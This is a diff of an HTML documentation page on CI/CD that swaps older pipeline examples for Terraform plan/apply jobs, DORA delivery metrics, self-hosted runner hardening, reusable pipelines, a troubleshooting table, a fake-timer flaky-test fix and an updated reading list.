-    <span class="pi">-</span> <span class="s">npm run test:chunk:${CI_NODE_INDEX}</span>
+    <span class="pi">-</span> <span class="s">terraform plan -input=false -out=tfplan</span>
+  <span class="na">artifacts</span><span class="pi">:</span>
+    <span class="na">paths</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">tfplan</span><span class="pi">]</span>
+    <span class="na">expire_in</span><span class="pi">:</span> <span class="s">1 week</span>
 
-<span class="c1"># Incremental builds</span>
-<span class="na">build</span><span class="pi">:</span>
-  <span class="na">script</span><span class="pi">:</span>
-    <span class="pi">-</span> <span class="s">npm run build --since=$CI_COMMIT_BEFORE_SHA</span>
-</code></pre></div></div>
-
-<h3 id="4-environment-drift">4. Environment Drift</h3>
-
-<p><strong>Problem</strong>: “Works in staging, breaks in production”</p>
-
-<p><strong>Solution</strong>:</p>
-<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Use identical environments</span>
-<span class="na">.deploy_template</span><span class="pi">:</span> <span class="nl">&amp;deploy_template</span>
-  <span class="na">image</span><span class="pi">:</span> <span class="s">deploy:v1.2.3</span>
-  <span class="na">variables</span><span class="pi">:</span>
-    <span class="na">TERRAFORM_VERSION</span><span class="pi">:</span> <span class="s2">"</span><span class="s">1.5.0"</span>
-    <span class="na">KUBECTL_VERSION</span><span class="pi">:</span> <span class="s2">"</span><span class="s">1.27.0"</span>
-
-<span class="na">deploy_staging</span><span class="pi">:</span>
-  <span class="na">&lt;&lt;</span><span class="pi">:</span> <span class="nv">*deploy_template</span>
-  <span class="na">environment</span><span class="pi">:</span> <span class="s">staging</span>
-
-<span class="na">deploy_production</span><span class="pi">:</span>
-  <span class="na">&lt;&lt;</span><span class="pi">:</span> <span class="nv">*deploy_template</span>
+<span class="na">apply</span><span class="pi">:</span>
+  <span class="na">stage</span><span class="pi">:</span> <span class="s">apply</span>
+  <span class="na">needs</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">plan</span><span class="pi">]</span>
   <span class="na">environment</span><span class="pi">:</span> <span class="s">production</span>
+  <span class="na">script</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="s">terraform apply -input=false tfplan</span>
+  <span class="na">rules</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="na">if</span><span class="pi">:</span> <span class="s">$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH</span>
+      <span class="na">when</span><span class="pi">:</span> <span class="s">manual</span>
 </code></pre></div></div>
 
-<h2 id="real-world-examples">Real-World Examples</h2>
+<p>Additional points:</p>
 
-<h3 id="example-1-e-commerce-platform">Example 1: E-commerce Platform</h3>
+<ul>
+  <li>
+<strong>Policy as code</strong>: OPA/Conftest, Checkov, or HCP Terraform Sentinel policies block non-compliant changes (public buckets, unencrypted volumes) before apply.</li>
+  <li>
+<strong>State</strong> lives in a locked remote backend. A saved plan file can contain sensitive values, so treat it like a secret and expire it quickly.</li>
+  <li>
+<strong>Drift detection</strong>: a scheduled <code class="language-plaintext highlighter-rouge">plan -detailed-exitcode</code> (exit code 2 means changes) reports resources modified outside the pipeline.</li>
+  <li>
+<strong>OpenTofu</strong> is the open-source fork of Terraform and a drop-in replacement for most pipelines. See <a href="../terraform/">Terraform</a>.</li>
+</ul>
 
-<p><strong>Challenge</strong>: Deploy updates without affecting active shoppers</p>
+<h2 id="measuring-delivery-dora-metrics">Measuring Delivery: DORA Metrics</h2>
 
-<p><strong>Solution</strong>:</p>
-<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">name</span><span class="pi">:</span> <span class="s">E-commerce Deployment</span>
+<p>The DORA research program (DevOps Research and Assessment, now part of Google Cloud) established the standard measures of software delivery performance. The current model uses <strong>five metrics</strong> in two groups:</p>
 
-<span class="na">on</span><span class="pi">:</span>
-  <span class="na">push</span><span class="pi">:</span>
-    <span class="na">branches</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">main</span><span class="pi">]</span>
+<table>
+  <thead>
+    <tr>
+      <th>Group</th>
+      <th>Metric</th>
+      <th>Definition</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Throughput</td>
+      <td><strong>Change lead time</strong></td>
+      <td>Time from a change being committed to it running in production</td>
+    </tr>
+    <tr>
+      <td>Throughput</td>
+      <td><strong>Deployment frequency</strong></td>
+      <td>How often changes are deployed to production</td>
+    </tr>
+    <tr>
+      <td>Throughput</td>
+      <td><strong>Failed deployment recovery time</strong></td>
+      <td>Time to recover from a deployment that fails and needs immediate intervention (formerly “MTTR”)</td>
+    </tr>
+    <tr>
+      <td>Instability</td>
+      <td><strong>Change fail rate</strong></td>
+      <td>Share of deployments that need immediate intervention (rollback or hotfix)</td>
+    </tr>
+    <tr>
+      <td>Instability</td>
+      <td><strong>Deployment rework rate</strong></td>
+      <td>Share of deployments that are unplanned and happen because of a production incident</td>
+    </tr>
+  </tbody>
+</table>
 
-<span class="na">jobs</span><span class="pi">:</span>
-  <span class="na">deploy</span><span class="pi">:</span>
-    <span class="na">runs-on</span><span class="pi">:</span> <span class="s">ubuntu-latest</span>
-    <span class="na">steps</span><span class="pi">:</span>
-      <span class="c1"># 1. Build and test</span>
-      <span class="pi">-</span> <span class="na">uses</span><span class="pi">:</span> <span class="s">actions/checkout@v4</span>
-      <span class="pi">-</span> <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
-          <span class="s">docker build -t shop:$GITHUB_SHA .</span>
-          <span class="s">docker run shop:$GITHUB_SHA npm test</span>
+<p>DORA’s research consistently finds that throughput and stability are <strong>not</strong> a trade-off: teams that deploy most often also tend to have the lowest failure rates, because small, frequent changes are easier to verify and reverse. Use the metrics to track a team’s trend over time, not to compare or rank teams, since that invites gaming.</p>
 
-      <span class="c1"># 2. Deploy to canary (5% traffic)</span>
-      <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Canary Deploy</span>
-        <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
-          <span class="s">kubectl set image deployment/shop-canary \</span>
-            <span class="s">shop=shop:$GITHUB_SHA -n production</span>
+<p>To compute them, the pipeline has to emit events: deployment start and finish with commit SHA, environment, and outcome, and incidents linked to the deployment that caused them. Most platforms expose this through their deployments API. <strong>OpenTelemetry</strong> now defines semantic conventions for CI/CD (<code class="language-plaintext highlighter-rouge">cicd.pipeline.*</code> attributes), so pipeline runs can be traced like any other distributed system and stored alongside service telemetry. Commercial “CI visibility” products (Datadog, Grafana, and others) build on the same data.</p>
 
-      <span class="c1"># 3. Monitor metrics</span>
-      <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Monitor Canary</span>
-        <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
-          <span class="s">./scripts/monitor-canary.sh --duration=30m \</span>
-            <span class="s">--error-threshold=1% \</span>
-            <span class="s">--latency-p99=200ms</span>
+<p>Operational pipeline metrics worth alerting on: queue time waiting for runners, p50/p95 pipeline duration, flaky-test rate (runs whose outcome changes on retry), and the success rate of the <code class="language-plaintext highlighter-rouge">main</code> branch.</p>
 
-      <span class="c1"># 4. Full rollout</span>
-      <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Production Deploy</span>
-        <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
-          <span class="s">kubectl set image deployment/shop \</span>
-            <span class="s">shop=shop:$GITHUB_SHA -n production</span>
-</code></pre></div></div>
-
-<h3 id="example-2-microservices-platform">Example 2: Microservices Platform</h3>
-
-<p><strong>Challenge</strong>: Coordinate deployment of 50+ services</p>
-
-<p><strong>Solution</strong>:</p>
-
-<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Monorepo CI/CD</span>
-<span class="na">name</span><span class="pi">:</span> <span class="s">Microservices Pipeline</span>
-
-<span class="na">on</span><span class="pi">:</span>
-  <span class="na">push</span><span class="pi">:</span>
-    <span class="na">branches</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">main</span><span class="pi">]</span>
-
-<span class="na">jobs</span><span class="pi">:</span>
-  <span class="na">detect-changes</span><span class="pi">:</span>
-    <span class="na">outputs</span><span class="pi">:</span>
-      <span class="na">services</span><span class="pi">:</span> <span class="s">${{ steps.filter.outputs.changes }}</span>
-    <span class="na">steps</span><span class="pi">:</span>
-      <span class="pi">-</span> <span class="na">uses</span><span class="pi">:</span> <span class="s">dorny/paths-filter@v2</span>
-        <span class="na">id</span><span class="pi">:</span> <span class="s">filter</span>
-        <span class="na">with</span><span class="pi">:</span>
-          <span class="na">filters</span><span class="pi">:</span> <span class="pi">|</span>
-            <span class="s">auth: services/auth/**</span>
-            <span class="s">payment: services/payment/**</span>
-            <span class="s">inventory: services/inventory/**</span>
-            <span class="s"># ... 47 more services</span>
-
-  <span class="na">build-and-deploy</span><span class="pi">:</span>
-    <span class="na">needs</span><span class="pi">:</span> <span class="s">detect-changes</span>
-    <span class="na">strategy</span><span class="pi">:</span>
-      <span class="na">matrix</span><span class="pi">:</span>
-        <span class="na">service</span><span class="pi">:</span> <span class="s">${{ fromJson(needs.detect-changes.outputs.services) }}</span>
-    <span class="na">steps</span><span class="pi">:</span>
-      <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Build Service</span>
-        <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
-          <span class="s">cd services/${{ matrix.service }}</span>
-          <span class="s">docker build -t ${{ matrix.service }}:$GITHUB_SHA .</span>
-
-      <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Deploy Service</span>
-        <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
-          <span class="s">helm upgrade --install ${{ matrix.service }} \</span>
-            <span class="s">./charts/${{ matrix.service }} \</span>
-            <span class="s">--set image.tag=$GITHUB_SHA \</span>
-            <span class="s">--wait --timeout=5m</span>
-</code></pre></div></div>
-
-<h3 id="example-3-mobile-app-deployment">Example 3: Mobile App Deployment</h3>
-
-<p><strong>Challenge</strong>: Deploy to multiple app stores with different requirements</p>
-
-<p><strong>Solution</strong>:</p>
-
-<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">name</span><span class="pi">:</span> <span class="s">Mobile App Release</span>
-
-<span class="na">on</span><span class="pi">:</span>
-  <span class="na">push</span><span class="pi">:</span>
-    <span class="na">tags</span><span class="pi">:</span>
-      <span class="pi">-</span> <span class="s1">'</span><span class="s">v*'</span>
-
-<span class="na">jobs</span><span class="pi">:</span>
-  <span class="na">build</span><span class="pi">:</span>
-    <span class="na">strategy</span><span class="pi">:</span>
-      <span class="na">matrix</span><span class="pi">:</span>
-        <span class="na">platform</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">ios</span><span class="pi">,</span> <span class="nv">android</span><span class="pi">]</span>
-
-    <span class="na">steps</span><span class="pi">:</span>
-      <span class="pi">-</span> <span class="na">uses</span><span class="pi">:</span> <span class="s">actions/checkout@v4</span>
-
-      <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Build ${{ matrix.platform }}</span>
-        <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
-          <span class="s">if [ "${{ matrix.platform }}" == "ios" ]; then</span>
-            <span class="s">fastlane ios build</span>
-          <span class="s">else</span>
-            <span class="s">fastlane android build</span>
-          <span class="s">fi</span>
-
-      <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Run Tests</span>
-        <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
-          <span class="s">if [ "${{ matrix.platform }}" == "ios" ]; then</span>
-            <span class="s">fastlane ios test</span>
-          <span class="s">else</span>
-            <span class="s">fastlane android test</span>
-          <span class="s">fi</span>
-
-  <span class="na">deploy</span><span class="pi">:</span>
-    <span class="na">needs</span><span class="pi">:</span> <span class="s">build</span>
-    <span class="na">steps</span><span class="pi">:</span>
-      <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Deploy to App Store</span>
-        <span class="na">run</span><span class="pi">:</span> <span class="s">fastlane ios release</span>
-
-      <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Deploy to Play Store</span>
-        <span class="na">run</span><span class="pi">:</span> <span class="s">fastlane android release</span>
-
-      <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Notify Team</span>
-        <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
-          <span class="s">curl -X POST $SLACK_WEBHOOK \</span>
-            <span class="s">-d '{"text":"Version ${{ github.ref }} released to app stores!"}'</span>
-</code></pre></div></div>
-
-<h2 id="advanced-topics">Advanced Topics</h2>
+<h2 id="runners-and-reuse-at-scale">Runners and Reuse at Scale</h2>
 
 <h3 id="self-hosted-runners">Self-Hosted Runners</h3>
 
-<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Setup for high-security environments</span>
-<span class="na">self-hosted-runner</span><span class="pi">:</span>
-  <span class="na">runs-on</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">self-hosted</span><span class="pi">,</span> <span class="nv">linux</span><span class="pi">,</span> <span class="nv">x64</span><span class="pi">,</span> <span class="nv">gpu</span><span class="pi">]</span>
-  <span class="na">container</span><span class="pi">:</span>
-    <span class="na">image</span><span class="pi">:</span> <span class="s">custom-runner:latest</span>
-    <span class="na">options</span><span class="pi">:</span> <span class="s">--gpus all</span>
-  <span class="na">steps</span><span class="pi">:</span>
-    <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">ML Model Training</span>
-      <span class="na">run</span><span class="pi">:</span> <span class="s">python train.py --gpu --distributed</span>
+<p>Self-hosted runners give access to private networks, special hardware (GPUs, arm64, large memory), and fixed-cost capacity. They also make the runner fleet part of your attack surface.</p>
+
+<ul>
+  <li>
+<strong>Make runners ephemeral.</strong> One job per runner, then destroy it (<code class="language-plaintext highlighter-rouge">--ephemeral</code> for GitHub runners). Persistent runners let one job leave backdoors, poisoned caches, or credentials for the next.</li>
+  <li>
+<strong>Autoscale on Kubernetes</strong> with <strong>Actions Runner Controller</strong> (runner scale sets) for GitHub, the GitLab Runner Kubernetes executor, or cloud autoscalers.</li>
+  <li>
+<strong>Never attach self-hosted runners to public repositories.</strong> Any fork PR could run arbitrary code inside your network.</li>
+  <li>
+<strong>Isolate by trust level.</strong> Keep separate runner groups for untrusted PR builds and for release and deploy jobs, with different network access and credentials.</li>
+</ul>
+
+<h3 id="reusable-pipelines">Reusable Pipelines</h3>
+
+<p>Copy-pasted pipeline YAML across hundreds of repositories cannot be kept secure or current. Centralize it:</p>
+
+<ul>
+  <li>
+<strong>GitHub</strong>: reusable workflows (<code class="language-plaintext highlighter-rouge">on: workflow_call</code>), called with <code class="language-plaintext highlighter-rouge">uses: org/pipelines/.github/workflows/build.yml@&lt;sha&gt;</code>, plus composite actions. Required workflows and repository rulesets enforce them organization-wide.</li>
+  <li>
+<strong>GitLab</strong>: CI/CD components published to the CI/CD Catalog and consumed with <code class="language-plaintext highlighter-rouge">include: component:</code>.</li>
+  <li>
+<strong>Jenkins</strong>: shared libraries (<code class="language-plaintext highlighter-rouge">@Library('pipeline-lib') _</code>).</li>
+</ul>
+
+<p>This is the core of <strong>platform engineering</strong>: a small team maintains “golden path” templates with security controls built in, and product teams consume them rather than writing pipelines from scratch.</p>
+
+<h2 id="troubleshooting-common-problems">Troubleshooting Common Problems</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Symptom</th>
+      <th>Likely causes</th>
+      <th>Remedies</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Passes locally, fails in CI</strong></td>
+      <td>Different tool versions, missing env vars, OS or architecture differences, test-order dependence</td>
+      <td>Pin toolchains (<code class="language-plaintext highlighter-rouge">.tool-versions</code>, <code class="language-plaintext highlighter-rouge">.nvmrc</code>, container image by digest); run CI steps in the same container locally; randomize test order locally too</td>
+    </tr>
+    <tr>
+      <td><strong>Flaky tests</strong></td>
+      <td>Real time and sleeps, shared state, network calls, race conditions</td>
+      <td>Fake timers, isolated fixtures, Testcontainers; automatically quarantine and ticket flaky tests</td>
+    </tr>
+    <tr>
+      <td><strong>Slow pipelines</strong></td>
+      <td>No caching, serial jobs, full test suite on every PR</td>
+      <td>Lockfile-keyed caches, DAG fan-out, test sharding, affected-only builds (see <a href="platforms-and-pipelines.html#keeping-pipelines-fast">Keeping Pipelines Fast</a>)</td>
+    </tr>
+    <tr>
+      <td><strong>Works in staging, breaks in production</strong></td>
+      <td>Artifact rebuilt per environment, config drift, different infrastructure versions</td>
+      <td>Build once and promote by digest; manage all environments from the same IaC modules and GitOps overlays</td>
+    </tr>
+    <tr>
+      <td><strong>Secret leaked in logs or history</strong></td>
+      <td>Debug <code class="language-plaintext highlighter-rouge">echo</code>, <code class="language-plaintext highlighter-rouge">set -x</code>, secret committed then “removed”</td>
+      <td>Rotate immediately (removing it from history is not enough); enable push protection and pre-commit gitleaks</td>
+    </tr>
+    <tr>
+      <td><strong>Deploys succeed but the service degrades</strong></td>
+      <td>Health checks only test liveness; no post-deploy verification</td>
+      <td>Real readiness probes; canary analysis on SLIs; automated rollback</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>An example of the most common flaky-test fix, using a fake clock instead of real time:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Flaky and slow: depends on the real clock</span>
+<span class="nf">it</span><span class="p">(</span><span class="dl">'</span><span class="s1">expires after 1 hour</span><span class="dl">'</span><span class="p">,</span> <span class="k">async </span><span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="nx">_600_000</span><span class="p">);</span>
+  <span class="nf">expect</span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nf">isExpired</span><span class="p">()).</span><span class="nf">toBe</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+<span class="p">});</span>
+
+<span class="c1">// Deterministic: advance a fake clock (Jest; Vitest's vi.useFakeTimers is equivalent)</span>
+<span class="nf">it</span><span class="p">(</span><span class="dl">'</span><span class="s1">expires after 1 hour</span><span class="dl">'</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="nx">jest</span><span class="p">.</span><span class="nf">useFakeTimers</span><span class="p">();</span>
+  <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nf">issueToken</span><span class="p">({</span> <span class="na">ttlMs</span><span class="p">:</span> <span class="mi">3</span><span class="nx">_600_000</span> <span class="p">});</span>
+  <span class="nx">jest</span><span class="p">.</span><span class="nf">advanceTimersByTime</span><span class="p">(</span><span class="mi">3</span><span class="nx">_600_001</span><span class="p">);</span>
+  <span class="nf">expect</span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nf">isExpired</span><span class="p">()).</span><span class="nf">toBe</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+  <span class="nx">jest</span><span class="p">.</span><span class="nf">useRealTimers</span><span class="p">();</span>
+<span class="p">});</span>
 </code></pre></div></div>
 
-<h3 id="pipeline-as-code-libraries">Pipeline as Code Libraries</h3>
+<h2 id="further-reading">Further Reading</h2>
 
-<div class="language-groovy highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Jenkins Shared Library</span>
-<span class="nd">@Library</span><span class="o">(</span><span class="s1">'company-pipeline-lib'</span><span class="o">)</span> <span class="n">_</span>
-
-<span class="n">companyPipeline</span> <span class="o">{</span>
-  <span class="n">language</span> <span class="o">=</span> <span class="s1">'java'</span>
-  <span class="n">type</span> <span class="o">=</span> <span class="s1">'microservice'</span>
-  <span class="n">deployEnvironments</span> <span class="o">=</span> <span class="o">[</span><span class="s1">'dev'</span><span class="o">,</span> <span class="s1">'staging'</span><span class="o">,</span> <span class="s1">'prod'</span><span class="o">]</span>
-  <span class="n">slackChannel</span> <span class="o">=</span> <span class="s1">'#deployments'</span>
-<span class="o">}</span>
-</code></pre></div></div>
-
-<h3 id="multi-cloud-deployments">Multi-Cloud Deployments</h3>
-
-<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">multi-cloud-deploy</span><span class="pi">:</span>
-  <span class="na">strategy</span><span class="pi">:</span>
-    <span class="na">matrix</span><span class="pi">:</span>
-      <span class="na">cloud</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">aws</span><span class="pi">,</span> <span class="nv">azure</span><span class="pi">,</span> <span class="nv">gcp</span><span class="pi">]</span>
-  <span class="na">steps</span><span class="pi">:</span>
-    <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Deploy to ${{ matrix.cloud }}</span>
-      <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
-        <span class="s">case "${{ matrix.cloud }}" in</span>
-          <span class="s">aws)</span>
-            <span class="s">terraform apply -var-file=aws.tfvars</span>
-            <span class="s">;;</span>
-          <span class="s">azure)</span>
-            <span class="s">terraform apply -var-file=azure.tfvars</span>
-            <span class="s">;;</span>
-          <span class="s">gcp)</span>
-            <span class="s">terraform apply -var-file=gcp.tfvars</span>
-            <span class="s">;;</span>
-        <span class="s">esac</span>
-</code></pre></div></div>
-
-<h2 id="emerging-trends-in-cicd">Emerging Trends in CI/CD</h2>
-
-<ol>
-  <li>
-<strong>AI-Powered CI/CD</strong>
-    <ul>
-      <li>Predictive test selection</li>
-      <li>Automated flaky test detection</li>
-      <li>AI-generated pipeline optimizations</li>
-      <li>Smart deployment timing</li>
-    </ul>
-  </li>
-  <li>
-<strong>Supply Chain Security</strong>
-    <ul>
-      <li>SBOM (Software Bill of Materials) generation</li>
-      <li>SLSA compliance automation</li>
-      <li>Sigstore for artifact signing</li>
-      <li>Dependency attestation</li>
-    </ul>
-  </li>
-  <li>
-<strong>Platform Engineering</strong>
-    <ul>
-      <li>Internal Developer Platforms (IDPs)</li>
-      <li>Golden paths for deployment</li>
-      <li>Self-service infrastructure</li>
-      <li>Developer experience metrics</li>
-    </ul>
-  </li>
-  <li>
-<strong>Green CI/CD</strong>
-    <ul>
-      <li>Carbon-aware computing</li>
-      <li>Energy-efficient build scheduling</li>
-      <li>Resource optimization</li>
-      <li>Sustainability metrics</li>
-    </ul>
-  </li>
-</ol>
-
-<h2 id="resources-and-further-learning">Resources and Further Learning</h2>
-
-<h3 id="essential-tools">Essential Tools</h3>
 <ul>
-  <li>
-<strong>Pipeline Syntax Validators</strong>:
-    <ul>
-      <li>GitHub Actions playground</li>
-      <li>GitLab CI Lint</li>
-      <li>CircleCI Config Validator</li>
-    </ul>
-  </li>
-  <li>
-<strong>Security Scanners</strong>:
-    <ul>
-      <li>Snyk (now with AI-powered fixes)</li>
-      <li>SonarQube/SonarCloud</li>
-      <li>Checkmarx</li>
-      <li>GitHub Advanced Security</li>
-    </ul>
-  </li>
-  <li>
-<strong>Monitoring</strong>:
-    <ul>
-      <li>Datadog CI Visibility</li>
-      <li>New Relic CodeStream</li>
-      <li>Grafana Cloud</li>
-      <li>OpenTelemetry (standard for observability)</li>
-    </ul>
-  </li>
-  <li>
-<strong>GitOps Operators</strong>:
-    <ul>
-      <li>ArgoCD (with ApplicationSets)</li>
-      <li>Flux v2</li>
-      <li>Crossplane (infrastructure composition)</li>
-    </ul>
-  </li>
+  <li>Jez Humble and David Farley, <em>Continuous Delivery</em> (2010): the foundational text.</li>
+  <li>Nicole Forsgren, Jez Humble, and Gene Kim, <em>Accelerate</em> (2018): the research behind the DORA metrics.</li>
+  <li>Gene Kim et al., <em>The DevOps Handbook</em>, 2nd ed. (2021).</li>
+  <li>David Farley, <em>Modern Software Engineering</em> (2021).</li>
+  <li>The annual DORA <em>State of DevOps / AI-assisted Software Development</em> reports (<a href="https://dora.dev/">dora.dev</a>).</li>
+  <li>SLSA specification (<a href="https://slsa.dev/">slsa.dev</a>) and Sigstore documentation (<a href="https://docs.sigstore.dev/">docs.sigstore.dev</a>).</li>
+  <li>GitHub’s <em>Security hardening for GitHub Actions</em> guide in the official Actions documentation.</li>
 </ul>
-
-<h3 id="books-and-courses">Books and Courses</h3>
-<ul>
-  <li>“Continuous Delivery” by Jez Humble (Classic)</li>
-  <li>“The DevOps Handbook” by Gene Kim et al.</li>
-  <li>“Accelerate” by Nicole Forsgren et al.</li>
-  <li>“Modern Software Engineering” by David Farley (2022)</li>
-  <li>“The Phoenix Project” &amp; “The Unicorn Project” by Gene Kim</li>
-</ul>
-
-<h3 id="online-learning">Online Learning</h3>
-<ul>
-  <li>
-<strong>DevOps with GitLab CI</strong> - GitLab’s official course</li>
-  <li>
-<strong>GitHub Actions Deep Dive</strong> - A Cloud Guru</li>
-  <li>
-<strong>Jenkins 2023 Masterclass</strong> - Udemy</li>
-  <li>
-<strong>CNCF CI/CD with Tekton</strong> - Linux Foundation</li>
-</ul>
-
-<h3 id="community-resources">Community Resources</h3>
-<ul>
-  <li>CNCF CI/CD Landscape</li>
-  <li>DevOps Weekly Newsletter</li>
-  <li>CI/CD Collective Forum</li>
-</ul>
-
-<p>Adopting CI/CD is incremental work: start simple, measure everything, and refine the pipeline based on what the metrics show.</p>
 
 <hr>
 
@@ -3728,13 +3573,15 @@ develop  → development/
   <li>
 <a href="platforms-and-pipelines.html">Platforms &amp; Pipeline Design</a> — choosing a platform and structuring pipelines</li>
   <li>
-<a href="deployment.html">Deployment Strategies</a> — blue-green, canary, and rolling rollouts</li>
+<a href="deployment.html">Deployment Strategies</a> — rolling, blue-green, canary, and feature flags</li>
+  <li>
+<a href="../docker/registry.html">Docker Registry &amp; Distribution</a> — image signing, SBOMs, and provenance at the registry</li>
   <li>
 <a href="../terraform/">Terraform</a> — infrastructure as code for the IaC pipelines above</li>
   <li>
-<a href="../cybersecurity/">Cybersecurity</a> — securing the pipeline and its secrets</li>
+<a href="../kubernetes/">Kubernetes</a> — the platform GitOps operators reconcile</li>
   <li>
-<a href="../docker/registry.html">Docker Registry &amp; Distribution</a> — image signing, SBOMs, and provenance at the registry level</li>
+<a href="../cybersecurity/">Cybersecurity</a> — wider security context for pipelines and secrets</li>
 </ul>
 
       </section>
